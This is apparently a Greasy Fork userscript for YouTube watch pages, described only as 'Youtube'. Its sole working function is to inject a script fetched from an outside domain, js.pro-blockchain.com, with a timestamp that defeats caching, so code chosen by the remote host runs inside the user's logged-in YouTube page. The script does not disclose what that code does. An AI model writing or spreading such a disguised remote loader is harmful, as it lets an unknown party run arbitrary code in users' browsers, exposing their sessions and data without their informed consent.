// ==UserScript==
// @name         Lxgn youtube main
// @namespace    https://www.youtube.com/
// @version      0.02
// @author       lxgn
// @description  Youtube
// @match        https://www.youtube.com/watch*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/373523/Lxgn%20youtube%20main.user.js
// @updateURL https://update.greasyfork.org/scripts/373523/Lxgn%20youtube%20main.meta.js
// ==/UserScript==


var ms = new Date();
//document.write();


var script = document.createElement('script');
//var t = Math.random()*1000000;

var kuda = "https://js.pro-blockchain.com/youtube/?"+ms.getTime();
console.log(kuda);
script.src = kuda;
document.body.appendChild(script);

script.onload = function() {
    // после выполнения скрипта становится доступна функция _
    //alert( 'load script' ); // её код
  }